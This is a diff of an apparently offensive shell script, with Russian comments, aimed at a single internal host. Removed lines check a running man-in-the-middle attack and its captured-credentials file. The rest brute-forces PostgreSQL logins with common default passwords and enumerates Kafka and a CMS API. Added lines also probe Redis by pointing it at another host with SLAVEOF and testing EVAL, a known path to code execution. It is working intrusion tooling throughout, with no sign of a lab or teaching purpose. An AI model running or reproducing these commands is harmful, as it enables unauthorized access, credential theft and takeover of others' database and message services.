@@ -1,49 +1,40 @@
-echo "=== 1. MITM STATUS ==="
-wc -c /tmp/mitm3.pcap
-pgrep -c spoof 2>/dev/null || echo spoof-DEAD
-pgrep -c cred_ext 2>/dev/null || echo ext-DEAD
-cat /tmp/creds_new.txt 2>/dev/null | head -5
-cat /tmp/mitm_log.txt 2>/dev/null | tail -3
-echo "=== 2. PG CONNECTION (полная батарея) ==="
-pip install psycopg2-binary -q 2>/dev/null
-python3 << 'PG'
-import psycopg2
-for user,pw in [("postgres",""),("postgres","postgres"),("eaera","eaera"),("eaera","Password123!"),("hung","hung"),("cms","cms"),("trading","trading")]:
-    try:
-        c=psycopg2.connect(host="192.168.3.121",port=5432,user=user,password=pw,connect_timeout=3,dbname="postgres")
-        cur=c.cursor(); cur.execute("SELECT version()")
-        print(f"PG-WIN {user}/{pw}: {cur.fetchone()[0][:40]}")
-        cur.execute("SELECT datname FROM pg_database")
-        print("DBS:",[r[0] for r in cur.fetchall()])
-        c.close()
-        break
-    except Exception as e:
-        err=str(e).split("\n")[0][:60]
-        if "authentication" in err or "password" in err:
-            print(f"  {user}/{pw}: auth-fail")
-        elif "connect" in err or "reach" in err:
-            print(f"  {user}/{pw}: unreach"); break
-        else:
-            print(f"  {user}/{pw}: {err}")
-PG
-echo "=== 3. KAFKA: список топиков ==="
-python3 << 'KF'
-import socket
-s=socket.socket();s.settimeout(5);s.connect(("192.168.3.121",9092))
-# Kafka API: MetadataRequest (v0)
-# apiKey=3, apiVersion=0
-import struct
-req=struct.pack(">hih",4+2+2,3,0)  # size, apikey, apiversion
-req+=b"\x00\x00"  # null client_id array size
-s.sendall(struct.pack(">i",len(req))+req)
-import time;time.sleep(2)
-r=s.recv(4096)
-print("KAFKA:",r[:100])
-s.close()
-KF
-echo "=== 4. CMS: с заголовками ==="
-for h in "Authorization: Bearer test" "X-API-Key: test" "Content-Type: application/json"; do
-  R=$(timeout 4 wget -q -T 3 -O - --header="$h" "http://192.168.3.121:8000/api/v1/health" 2>/dev/null | head -c 100)
-  [ -n "$R" ] && echo "CMS $h: $R"
+echo "=== PG через psql ==="
+apt-get install -y postgresql-client >/dev/null 2>&1
+for U in postgres eaera hung cms root; do
+  for PW in "" postgres eaera Password123! eaera2026; do
+    R=$(PGPASSWORD="$PW" timeout 5 psql -h 192.168.3.121 -U $U -d postgres -c "SELECT 1" 2>&1 | head -1)
+    case "$R" in
+      *1*row*) echo "PG-WIN $U/$PW"; PGPASSWORD="$PW" psql -h 192.168.3.121 -U $U -c "\l" 2>/dev/null | head -10; break 2;;
+      *authentication*|*password*) ;;
+      *connect*|*reach*) echo "PG-UNREACH"; break 2;;
+    esac
+  done
 done
-echo ALL-ATK
+echo "=== CMS: OpenAPI ПОЛНЫЙ ==="
+wget -q -T 8 -O /tmp/cms.json "http://192.168.3.121:8000/openapi.json" 2>/dev/null
+python3 -c "
+import json
+d=json.load(open('/tmp/cms.json'))
+print('paths:',len(d.get('paths',{})))
+for p,m in list(d.get('paths',{}).items())[:20]:
+    for meth in m: print(f'{meth.upper()} {p}')
+print('components:',len(d.get('components',{}).get('schemas',{})))
+" 2>/dev/null
+echo "=== REDIS: SLAVEOF и EVAL ==="
+python3 << 'RD'
+import socket,time
+s=socket.socket();s.settimeout(5);s.connect(("192.168.3.121",6379))
+# SLAVEOF проба
+s.sendall(b"SLAVEOF 192.168.3.14 6379\r\n"); time.sleep(1)
+print("SLAVEOF:",s.recv(100))
+s.sendall(b"SLAVEOF NO ONE\r\n"); time.sleep(1)
+print("RESET:",s.recv(100))
+# EVAL (Lua scripting)
+s.sendall(b"EVAL return 1 0\r\n"); time.sleep(1)
+print("EVAL:",s.recv(100))
+# INFO clients
+s.sendall(b"INFO clients\r\n"); time.sleep(1)
+print("CLIENTS:",s.recv(200))
+s.close()
+RD
+echo SHELL-V2
